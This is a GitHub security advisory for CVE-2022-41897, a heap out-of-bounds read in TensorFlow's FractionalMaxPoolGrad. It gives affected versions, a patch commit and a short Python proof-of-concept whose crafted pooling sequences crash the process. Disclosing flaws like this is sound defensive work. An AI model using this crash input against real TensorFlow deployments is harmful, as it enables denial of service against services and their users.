# [M] `FractionalMaxPoolGrad` Heap out of bounds read

## Summary
Severity: Medium
Advisory: GHSA-f2w8-jw48-fr7j
CVE: CVE-2022-41897
CWE: CWE-125
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-11-21
Source: https://github.com/advisories/GHSA-f2w8-jw48-fr7j
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.8.4
- PyPI: `tensorflow` — affected >=2.9.0 <2.9.3
- PyPI: `tensorflow` — affected >=2.10.0 <2.10.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.8.4
- PyPI: `tensorflow-gpu` — affected >=0 <2.8.4
- PyPI: `tensorflow-cpu` — affected >=2.9.0 <2.9.3
- PyPI: `tensorflow-gpu` — affected >=2.9.0 <2.9.3
- PyPI: `tensorflow-cpu` — affected >=2.10.0 <2.10.1
- PyPI: `tensorflow-gpu` — affected >=2.10.0 <2.10.1

## Details
### Impact
If [`FractionMaxPoolGrad`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/fractional_max_pool_op.cc) is given outsize inputs `row_pooling_sequence` and `col_pooling_sequence`, TensorFlow will crash.

```python
import tensorflow as tf
tf.raw_ops.FractionMaxPoolGrad(
	orig_input = [[[[1, 1, 1, 1, 1]]]],
    orig_output = [[[[1, 1, 1]]]],
    out_backprop = [[[[3], [3], [6]]]],
    row_pooling_sequence = [-0x4000000, 1, 1], 
    col_pooling_sequence = [-0x4000000, 1, 1], 
    overlapping = False
 )
```

### Patches
We have patched the issue in GitHub commit [d71090c3e5ca325bdf4b02eb236cfb3ee823e927](https://github.com/tensorflow/tensorflow/commit/d71090c3e5ca325bdf4b02eb236cfb3ee823e927).

The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Vul AI.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-f2w8-jw48-fr7j
- https://nvd.nist.gov/vuln/detail/CVE-2022-41897
- https://github.com/tensorflow/tensorflow/commit/d71090c3e5ca325bdf4b02eb236cfb3ee823e927
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/fractional_max_pool_op.cc
